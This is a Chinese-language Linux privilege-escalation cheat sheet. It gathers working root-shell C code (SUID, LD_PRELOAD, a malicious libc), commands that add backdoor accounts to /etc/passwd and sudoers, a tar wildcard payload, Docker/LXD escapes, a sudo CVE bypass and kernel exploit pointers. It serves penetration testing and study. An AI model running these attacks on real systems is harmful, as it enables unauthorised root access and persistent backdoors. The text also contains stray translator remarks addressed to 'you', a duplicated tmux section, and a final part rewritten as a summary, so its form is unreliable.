# Linux - 权限提升

## 摘要

* [工具](#tools)
* [检查清单](#checklists)
* [搜寻密码](#looting-for-passwords)
  * [包含密码的文件](#files-containing-passwords)
  * [/etc/security/opasswd中的旧密码](#old-passwords-in-etcsecurityopasswd)
  * [最后编辑的文件](#last-edited-files)
  * [内存中的密码](#in-memory-passwords)
  * [查找敏感文件](#find-sensitive-files)
* [SSH 密钥](#ssh-key)
  * [敏感文件](#sensitive-files)
  * [SSH 密钥可预测的伪随机数生成器（Authorized_Keys）过程](#ssh-key-predictable-prng-authorized_keys-process)
* [计划任务](#scheduled-tasks)
  * [Cron作业](#cron-jobs)
  * [Systemd计时器](#systemd-timers)
* [SUID](#suid)
  * [查找SUID二进制文件](#find-suid-binaries)
  * [创建SUID二进制文件](#create-a-suid-binary)
* [功能](#capabilities)
  * [列出二进制文件的功能](#list-capabilities-of-binaries)
  * [编辑功能](#edit-capabilities)
  * [有趣的功能](#interesting-capabilities)
* [SUDO](#sudo)
  * [NOPASSWD](#nopasswd)
  * [LD_PRELOAD和NOPASSWD](#ld_preload-and-nopasswd)
  * [Doas](#doas)
  * [sudo_inject](#sudo_inject)
  * [CVE-2019-14287](#cve-2019-14287)
* [GTFOBins](#gtfobins)
* [通配符](#wildcard)
* [可写文件](#writable-files)
  * [可写的/etc/passwd](#writable-etcpasswd)
  * [可写的/etc/sudoers](#writable-etcsudoers)
* [NFS根目录缩减](#nfs-root-squashing)
* [共享库](#shared-library)
  * [ldconfig](#ldconfig)
  * [RPATH](#rpath)
* [组](#groups)
  * [Docker](#docker)
  * [LXC/LXD](#lxclxd)
* [劫持TMUX会话](#hijack-tmux-session)
* [内核漏洞利用](#kernel-exploits)
  * [CVE-2022-0847 (DirtyPipe)](#cve-2022-0847-dirtypipe)	
  * [CVE-2016-5195 (DirtyCow)](#cve-2016-5195-dirtycow)
  * [CVE-2010-3904 (RDS)](#cve-2010-3904-rds)
  * [CVE-2010-4258 (Full Nelson)](#cve-2010-4258-full-nelson)
  * [CVE-2012-0056 (Mempodipper)](#cve-2012-0056-mempodipper)

## 工具

有许多脚本可以在Linux机器上执行，这些脚本会自动枚举系统信息、进程和文件，以定位权限提升向量。
以下是一些：

- [LinPEAS - Linux权限提升棒极了脚本](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

```powershell
wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o linpeas.sh
./linpeas.sh -a #所有检查 - 更深入的系统枚举，但完成时间较长。
./linpeas.sh -s #超快且隐蔽 - 这将跳过一些耗时的检查。在隐蔽模式下，不会向磁盘写入任何内容。
./linpeas.sh -P #密码 - 传递一个将用于sudo -l和其他用户暴力破解的密码
```

- [LinuxSmartEnumeration - Linux枚举工具，用于渗透测试和CTF](https://github.com/diego-treitos/linux-smart-enumeration)

```powershell
wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh
./lse.sh -l1 #显示有趣的信息，应该有助于提升权限
./lse.sh -l2 #转储它收集到的关于系统的所有信息
```

- [LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks](https://github.com/rebootuser/LinEnum)

    ```powershell
    ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
    ```

- [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
- [linuxprivchecker.py - a Linux Privilege Escalation Check Script](https://github.com/sleventyeleven/linuxprivchecker)
- [unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
- [Privilege Escalation through sudo - Linux](https://github.com/TH3xACE/SUDO_KILLER)

## 检查清单

* 内核和发行版发布详情
* 系统信息：
  * 主机名
  * 网络详细信息：
  * 当前IP
  * 默认路由详情
  * DNS服务器信息
* 用户信息：
  * 当前用户详细信息
  * 最后登录的用户
  * 显示登录到主机上的用户
  * 列出包括uid/gid信息的所有用户
  * 列出root账户
  * 提取密码策略和哈希存储方法信息
  * 检查umask值
  * 检查密码哈希是否存储在/etc/passwd中
  * 提取'默认' uid（如0、1000、1001等）的完整详细信息
  * 尝试读取受限文件，即/etc/shadow
  * 列出当前用户的历史文件（即.bash_history、.nano_history、.mysql_history等）
  * 基本SSH检查
* 特权访问：
  * 最近哪些用户使用过sudo
  * 确定/etc/sudoers是否可访问
  * 确定当前用户是否可以在无需密码的情况下使用Sudo
  * 是否可以通过Sudo访问已知的'好'的突围二进制文件（如nmap、vim等）
  * 根目录是否可访问
  * 列出/home/的权限
* 环境：
  * 显示当前的$PATH
  * 显示环境信息
* 作业/任务：
  * 列出所有cron作业
  * 找到所有全局可写的cron作业
  * 找到系统其他用户拥有的cron作业
  * 列出活动和非活动的systemd计时器
* 服务：
  * 列出网络连接（TCP和UDP）
  * 列出正在运行的进程
  * 查找并列出进程二进制文件及其相关权限
  * 列出inetd.conf/xined.conf内容及相关二进制文件权限
  * 列出init.d二进制权限
* 版本信息（以下各项的版本）：
  * Sudo
  * MYSQL
  * Postgres
  * Apache
    * 检查用户配置
    * 显示启用的模块
    * 检查htpasswd文件
    * 查看www目录
* 默认/弱密码：
  * 检查默认/弱Postgres账户
  * 检查默认/弱MYSQL账户
* 搜索：
  * 找到所有SUID/GUID文件
  * 找到所有全局可写的SUID/GUID文件
  * 找到由root拥有的所有SUID/GUID文件
  * 找到'有趣'的SUID/GUID文件（如nmap、vim等）
  * 找到具有POSIX功能的文件
  * 列出所有全局可写文件
  * 查找/列出所有可访问的*.plan文件并显示内容
  * 查找/列出所有可访问的*.rhosts文件并显示内容
  * 显示NFS服务器详细信息
  * 在脚本运行时定位包含关键字的*.conf和*.log文件
  * 列出位于/etc中的所有*.conf文件
  * 定位邮件

* 平台/软件特定测试：
  * 检查我们是否在Docker容器中
  * 检查主机是否安装了Docker
  * 检查我们是否在LXC容器中

## 搜寻密码

### 包含密码的文件

```powershell
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

### /etc/security/opasswd中的旧密码

`/etc/security/opasswd`文件也被pam_cracklib用来保存旧密码的历史记录，以便用户不会重复使用它们。

:warning: 像处理/etc/shadow文件一样处理你的opasswd文件，因为它最终会包含用户密码哈希

### 最后编辑的文件

在过去10分钟内编辑过的文件

```powershell
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
```

### 内存中的密码

```powershell
strings /dev/mem -n10 | grep -i PASS
```

### 查找敏感文件

```powershell
$ locate password | more           
/boot/grub/i386-pc/password.mod
/etc/pam.d/common-password
/etc/pam.d/gdm-password
/etc/pam.d/gdm-password.original
/lib/live/config/0031-root-password
...
```

## SSH密钥

### 敏感文件

```
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
...
```

### SSH密钥可预测的PRNG（授权密钥）过程

本模块描述了如何在主机系统上尝试使用获得的authorized_keys文件。

需要：来自authorized_keys文件的SSH-DSS字符串

**步骤**

1. 获取authorized_keys文件。该文件的示例如下所示：

```
ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (剪接) ...
```

2. 由于这是一个ssh-dss密钥，我们需要将其添加到我们的本地`/etc/ssh/ssh_config`和`/etc/ssh/sshd_config`文件中：

```
echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/ssh_config
echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/sshd_config
/etc/init.d/ssh restart
```

3. 获取[g0tmi1k的debian-ssh仓库](https://github.com/g0tmi1k/debian-ssh)并解压缩密钥：

```
git clone https://github.com/g0tmi1k/debian-ssh
cd debian-ssh
tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
```

4. 从上面显示的密钥文件中获取以`"AAAA..."`部分开头的最初20或30个字节，并用它来搜索解压缩后的密钥，如下所示：

```
grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'
dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub
```

5. 如果成功，这将返回一个文件（68b329da9893e34099c7d8ad5cb9c940-17934.pub）公共文件。要使用私钥文件进行连接，请删除'.pub'扩展名并执行以下操作：

```
ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934
```

这样应该可以在不需要密码的情况下连接。如果卡住了，`-vvv`详细级别应该能提供足够的细节来说明原因。

## 计划任务

### 定时任务

检查您是否有对这些文件的写入权限。   
检查文件内部，找到具有写入权限的其他路径。   

```powershell
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```

您可以使用[pspy](https://github.com/DominicBreuker/pspy)来检测CRON作业。

```powershell
# 打印命令和文件系统事件，并每1000毫秒（=1秒）扫描一次procfs
./pspy64 -pf -i 1000 
```


## 系统d定时器

```powershell
systemctl list-timers --all
NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
Mon 2019-04-01 02:59:14 CEST  15小时剩余 Sun 2019-03-31 10:52:49 CEST  24分钟前          apt-daily.timer              apt-daily.service
Mon 2019-04-01 06:20:40 CEST  19小时剩余 Sun 2019-03-31 10:52:49 CEST  24分钟前          apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2019-04-01 07:36:10 CEST  20小时剩余 Sat 2019-03-09 14:28:25 CET   3周0天前的 systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

列出了3个定时器。
```

## SUID

SUID/Setuid代表“执行时设置用户ID”，默认在每个Linux发行版中都启用。如果设置了此位的文件运行，将更改调用进程的实际和有效用户ID。如果文件所有者是`root`，即使是从用户`bob`执行的，用户ID也会更改为`root`。SUID位由`s`表示。

```powershell
╭─swissky@lab ~  
╰─$ ls /usr/bin/sudo -alh                  
-rwsr-xr-x 1 root root 138K 23 nov. 16:04 /usr/bin/sudo
```

### 查找SUID二进制文件

```bash
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

### 创建SUID二进制文件

| 函数       | 描述                           |
| ---------- | ------------------------------ |
| setreuid() | 设置调用进程的实际和有效用户ID |
| setuid()   | 设置调用进程的有效用户ID       |
| setgid()   | 设置调用进程的有效组ID         |


```bash
print 'int main(void){
setresuid(0, 0, 0);
system("/bin/sh");
}' > /tmp/suid.c   
gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid # 执行权限
sudo chmod +s /tmp/suid # 设置suid位
```


## 功能

### 列出二进制的功能

```powershell
╭─swissky@lab ~  
╰─$ /usr/bin/getcap -r  /usr/bin
/usr/bin/fping                = cap_net_raw+ep
/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/rlogin               = cap_net_bind_service+ep
/usr/bin/ping                 = cap_net_raw+ep
/usr/bin/rsh                  = cap_net_bind_service+ep
/usr/bin/rcp                  = cap_net_bind_service+ep
```

### 编辑功能

```powershell
/usr/bin/setcap -r /bin/ping            # remove
/usr/bin/setcap cap_net_raw+p /bin/ping # add
```

### 有趣的功能

拥有能力=ep意味着二进制文件具有所有功能。

```powershell
$ getcap openssl /usr/bin/openssl 
openssl=ep
```

或者，可以使用以下功能来提升当前权限。

```powershell
cap_dac_read_search # 读取任何内容
cap_setuid+ep # 设置用户ID
```

使用`cap_setuid+ep`进行权限提升的示例

```powershell
$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7

$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
sh-5.0# id
uid=0(root) gid=1000(swissky)
```

| 功能名称             | 描述                                                         |
| -------------------- | ------------------------------------------------------------ |
| CAP_AUDIT_CONTROL    | 允许启用/禁用内核审计                                        |
| CAP_AUDIT_WRITE      | 帮助将记录写入内核审计日志                                   |
| CAP_BLOCK_SUSPEND    | 此功能可以阻止系统暂停                                       |
| CAP_CHOWN            | 允许用户对文件UID和GIDs进行任意更改                          |
| CAP_DAC_OVERRIDE     | 这有助于绕过文件读取、写入和执行权限检查                     |
| CAP_DAC_READ_SEARCH  | 这只绕过文件和目录的读/执行权限检查                          |
| CAP_FOWNER           | 这使得在通常需要进程的文件系统UID与文件的UID匹配的操作中，可以绕过权限检查 |
| CAP_KILL             | 允许向属于其他人的进程发送信号                               |
| CAP_SETGID           | 允许更改GID                                                  |
| CAP_SETUID           | 允许更改UID                                                  |
| CAP_SETPCAP          | 有助于转移和删除当前集合到任何PID                            |
| CAP_IPC_LOCK         | 这有助于锁定内存                                             |
| CAP_MAC_ADMIN        | 允许MAC配置或状态更改                                        |
| CAP_NET_RAW          | 使用原始和数据包套接字                                       |
| CAP_NET_BIND_SERVICE | 服务将套接字绑定到互联网域特权端口                           |

## SUDO

工具：[Sudo Exploitation](https://github.com/TH3xACE/SUDO_KILLER)

### NOPASSWD

Sudo配置可能允许用户在不知道密码的情况下以另一个用户的权限执行某些命令。

```bash
$ sudo -l

用户demo可以在crashlab上运行以下命令：
    (root) NOPASSWD: /usr/bin/vim
```

在这个例子中，用户`demo`可以作为`root`运行`vim`，现在通过在根目录添加ssh密钥或调用`sh`来获得一个shell变得很简单。

```bash
sudo vim -c '!sh'
sudo -u root vim -c '!sh'
```

### LD_PRELOAD和NOPASSWD

如果在sudoers文件中显式定义了`LD_PRELOAD`

```powershell
Defaults        env_keep += LD_PRELOAD
```

使用下面的C代码编译共享对象，使用`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

通过LD_PRELOAD执行任何二进制文件以生成shell：`sudo LD_PRELOAD=<full_path_to_so_file> <program>`，例如：`sudo LD_PRELOAD=/tmp/shell.so find`

### Doas

有一些替代`sudo`二进制的工具，例如OpenBSD的`doas`，记得检查其配置文件`/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
```

### sudo_inject

使用[https://github.com/nongiach/sudo_inject](https://github.com/nongiach/sudo_inject)

```powershell
$ sudo whatever
[sudo] 用户密码：    
# 按<ctrl>+c，因为你没有密码。 
# 这会创建一个无效的sudo令牌。
$ sh exploit.sh
.... 等待1秒
$ sudo -i # 不需要密码 :)
# id
uid=0(root) gid=0(root) 组=0(root)
```

演示文稿的幻灯片：[https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf](https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf)

### CVE-2019-14287

```powershell
# 当用户具有以下权限时可利用（sudo -l）
(ALL, !root) ALL

# 如果你有一个完整的TTY，你可以像这样利用它
sudo -u#-1 /bin/bash
sudo -u#4294967295 id
```

## GTFOBins

[GTFOBins](https://gtfobins.github.io)是一个精心策划的Unix二进制文件列表，攻击者可以利用这些二进制文件绕过本地安全限制。

该项目收集了Unix二进制文件的合法功能，这些功能可以被滥用以突破受限壳层，提升或维持提升的权限，传输文件，生成绑定和反向壳层，以及促进其他后渗透任务。

> gdb -nx -ex '!sh' -ex quit    
> sudo mysql -e '\! /bin/sh'    
> strace -o /dev/null /bin/sh    
> sudo awk 'BEGIN {system("/bin/sh")}'


## 通配符

通过使用带有–checkpoint-action选项的tar，可以在检查点后使用指定的操作。这个操作可以是一个恶意脚本，用于在启动tar的用户下执行任意命令。“诱骗”root使用特定选项相当容易，这就是通配符派上用场的地方。

```powershell
# 创建用于利用的文件
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo "#\!/bin/bash
cat /etc/passwd > /tmp/flag
chmod 777 /tmp/flag" > shell.sh

# 易受攻击的脚本
tar cf archive.tar *
```

工具：[wildpwn](https://github.com/localh0t/wildpwn)

## 可写文件

列出系统上世界可写的文件。

```powershell
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
find / -perm -2 -type f 2>/dev/null
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

### 可写的/etc/sysconfig/network-scripts/ (Centos/Redhat)

例如/etc/sysconfig/network-scripts/ifcfg-1337

```powershell
NAME=Network /bin/id  &lt;= 注意空格
ONBOOT=yes
DEVICE=eth0

EXEC :
./etc/sysconfig/network-scripts/ifcfg-1337
```

src : [https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

### 可写的/etc/passwd

首先使用以下命令之一生成密码。

```powershell
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

然后添加用户`hacker`并添加生成的密码。

```powershell
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

例如：`hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

现在可以使用`su`命令和`hacker:hacker`

或者，可以使用以下行添加一个没有密码的虚拟用户。    
警告：你可能会降低机器当前的安全性。

```powershell
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

注意：在BSD平台上，`/etc/passwd`位于`/etc/pwd.db`和`/etc/master.passwd`，`/etc/shadow`重命名为`/etc/spwd.db`。

文档：
### 可写 /etc/sudoers

```powershell
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers

# 使用SUDO无需密码
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
```

## NFS根目录压扁

当`/etc/exports`中出现**no_root_squash**时，该文件夹是可共享的，远程用户可以挂载它。

```powershell
# 远程检查文件夹名称
showmount -e 10.10.10.10

# 创建目录
mkdir /tmp/nfsdir  

# 挂载目录
mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
cd /tmp/nfsdir

# 复制所需的shell
cp /bin/bash . 	

# 设置suid权限
chmod +s bash 	
```

## 共享库

### ldconfig

使用`ldd`识别共享库

```powershell
$ ldd /opt/binary
    linux-vdso.so.1 (0x00007ffe961cd000)
    vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        
```

在`/tmp`中创建库并激活路径。

```powershell
gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
/opt/binary
```

### RPATH

```powershell
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15 
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

通过将库复制到`/var/tmp/flag15/`，程序将在`RPATH`变量中指定的位置使用它。

```powershell
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15 
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

然后在`/var/tmp`中使用`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`创建一个恶意库

```powershell
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## 组

### Docker

在bash容器中挂载文件系统，允许您以root身份编辑`/etc/passwd`，然后添加后门账户`toor:password`。

```bash
$> docker run -it --rm -v $PWD:/mnt bash
$> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
```

几乎类似，但您还将看到主机上运行的所有进程，并连接到相同的NIC。

```powershell
docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
```

或者使用以下来自[chrisfosterelli](https://hub.docker.com/r/chrisfosterelli/rootplease/)的docker镜像来生成一个root shell

```powershell
$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
latest: Pulling from chrisfosterelli/rootplease
2de59b831a23: Pull complete 
354c3661655e: Pull complete 
91930878a2d7: Pull complete 
a3ed95caeb02: Pull complete 
489b110c54dc: Pull complete 
Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
Status: Downloaded newer image for chrisfosterelli/rootplease:latest

您现在应该在主机操作系统上拥有一个root shell
按Ctrl-D退出docker实例/shell

sh-5.0# id
uid=0(root) gid=0(root) groups=0(root)
```

更多使用Docker套接字进行Docker权限提升的方法。

```powershell
sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

### LXC/LXD

权限提升需要以提升的特权运行容器并在内部挂载主机文件系统。

```powershell
╭─swissky@lab ~  
╰─$ id
uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)
```

构建一个Alpine镜像并使用标志`security.privileged=true`启动它，强制容器以root身份与主机文件系统交互。

```powershell
# 构建一个简单的Alpine镜像
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine -a i686

# 导入镜像
lxc image import ./alpine.tar.gz --alias myimage

# 运行镜像
lxc init myimage mycontainer -c security.privileged=true

# 将/root挂载到镜像中
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# 与容器交互
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

另外，请参见https://github.com/initstring/lxd_root

## 劫持TMUX会话

Require a read access to the tmux socket : `/tmp/tmux-1000/default`.

```powershell
export TMUX=/tmp/tmux-1000/default,1234,0 
tmux ls
```

根据您上传的文档内容，这是文档的翻译版本：

需要读取tmux套接字的权限：`/tmp/tmux-1000/default`。

```powershell
export TMUX=/tmp/tmux-1000/default,1234,0
tmux ls
```

## 内核漏洞利用

在这些仓库中可以找到预编译的漏洞利用程序，运行它们风险自负！

* [bin-sploits - @offensive-security](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)
* [kernel-exploits - @lucyoa](https://github.com/lucyoa/kernel-exploits/)

以下漏洞已知效果良好，使用`searchsploit -w linux kernel centos`搜索更多漏洞。

另一种找到内核漏洞的方法是通过执行`uname -a`获取机器的特定内核版本和Linux发行版。复制内核版本和发行版，然后在谷歌或https://www.exploit-db.com/ 中搜索。

### CVE-2022-0847 (DirtyPipe)

Linux权限提升 - Linux内核 5.8 < 5.16.11

```
https://www.exploit-db.com/exploits/50808
```

### CVE-2016-5195 (DirtyCow)

Linux权限提升 - Linux内核 <= 3.19.0-73.8

```powershell
# 使dirtycow稳定
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### CVE-2010-3904 (RDS)

Linux RDS漏洞利用 - Linux内核 <= 2.6.36-rc8

```powershell
https://www.exploit-db.com/exploits/15285/
```

根据您提供的文档内容，这是一份关于Linux内核漏洞的列表，以及相关的安全参考资料。以下是核心信息的整理：

- **CVE-2010-4258 (Full Nelson)**：影响Linux Kernel 2.6.37（RedHat / Ubuntu 10.04）的漏洞。
  - 文档链接：[https://www.exploit-db.com/exploits/15704/](https://www.exploit-db.com/exploits/15704/)

- **CVE-2012-0056 (Mempodipper)**：影响Linux Kernel 2.6.39 < 3.2.2（Gentoo / Ubuntu x86/x64）的漏洞。
  - 文档链接：[https://www.exploit-db.com/exploits/18411](https://www.exploit-db.com/exploits/18411)

**参考资料**：

1. **SUID vs Capabilities** - Nick Void aka mn3m, 2017年12月7日
   - 链接：[https://mn3m.info/posts/suid-vs-capabilities/](https://mn3m.info/posts/suid-vs-capabilities/)

2. **通过Docker进行权限提升** - Chris Foster, 2015年4月22日
   - 链接：[https://fosterelli.co/privilege-escalation-via-docker.html](https://fosterelli.co/privilege-escalation-via-docker.html)

3. **一个有趣的权限提升向量（getcap/setcap）** - NXNJZ, 2018年8月21日
   - 链接：[https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)

4. **在Linux上利用通配符** - Berislav Kucan
   - 链接：[https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/)

5. **使用Tar命令执行代码** - p4pentest, 2016年10月19日
   - 链接：[http://p4pentest.in/2016/10/19/code-execution-with-tar-command/](http://p4pentest.in/2016/10/19/code-execution-with-tar-command/)

6. **回到未来：Unix通配符失控** - Leon Juranic
   - 链接：[http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)

7. **如何通过弱NFS权限进行权限提升？** - 2018年4月25日
   - 链接：[https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/](https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/)

8. **通过lxd进行权限提升** - @reboare
   - 链接：[https://reboare.github.io/lxd/lxd-escape.html](https://reboare.github.io/lxd/lxd-escape.html)

9. **编辑/etc/passwd文件以进行权限提升** - Raj Chandel, 2018年5月12日
   - 链接：[https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)

10. **通过注入拥有sudo令牌的进程进行权限提升** - @nongiach @chaignc
    - 链接：[https://github.com/nongiach/sudo_inject](https://github.com/nongiach/sudo_inject)

11. **Linux密码安全性与pam_cracklib** - Hal Pomeranz, Deer Run Associates
    - 链接：[http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html](http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html)

12. **本地权限提升工作坊** - @sagishahar, Slides.pdf
    - 链接：[https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)

13. **SSH密钥可预测PRNG（Authorized_Keys）过程** - @weaknetlabs
    - 链接：[https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/SSH/key-exploit.md](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/SSH/key-exploit.md)

14. **Dirty Pipe漏洞**
    - 链接：[https://dirtypipe.cm4all.com/](https://dirtypipe.cm4all.com/)
